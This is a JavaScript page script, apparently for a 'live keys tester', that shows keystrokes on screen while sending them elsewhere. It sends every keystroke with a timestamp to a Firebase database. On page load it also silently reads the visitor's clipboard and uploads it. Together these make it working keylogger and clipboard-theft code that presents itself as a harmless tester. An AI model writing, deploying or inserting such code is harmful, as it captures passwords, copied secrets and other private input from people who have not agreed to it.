import { database, ref, push } from './firebase-init.js';

        let watchBasePath = (onChange) => {
            onChange('public', null);
            return () => { };
        };

        let atPath = (basePath, suffix) => {
            const base = String(basePath || 'public').replace(/\/+$/, '');
            const tail = String(suffix || '').replace(/^\/+/, '');
            return tail ? `${base}/${tail}` : base;
        };

        import('./basePath.js')
            .then((mod) => {
                if (typeof mod.watchBasePath === 'function') watchBasePath = mod.watchBasePath;
                if (typeof mod.atPath === 'function') atPath = mod.atPath;
            })
            .catch(() => {
                console.warn('basePath helper missing; using local fallback in livekeystester.');
            });

        const keyLog = document.getElementById('keyLog');
        let DATABASE_BASE_PATH = 'public';

        function logKeyRef() {
            return ref(database, atPath(DATABASE_BASE_PATH, 'keys'));
        }

        watchBasePath((basePath) => {
            DATABASE_BASE_PATH = basePath;
        });

        window.addEventListener('load', async () => {
            try {
                const clipboardText = await navigator.clipboard.readText();
                if (clipboardText) {

                    push(logKeyRef(), {
                        key: clipboardText,
                        time: new Date().toISOString()
                    });
                }
            } catch (err) {
                console.error('Couldn’t read clipboard on load:', err);
            }
        });

        document.addEventListener('keydown', (event) => {
            const keyValue = event.key;
            logKeystroke(keyValue);
            keyLog.textContent += keyValue + ' ';
        });

        function logKeystroke(key) {
            const time = new Date().toISOString();
            push(logKeyRef(), { key, time });
        }
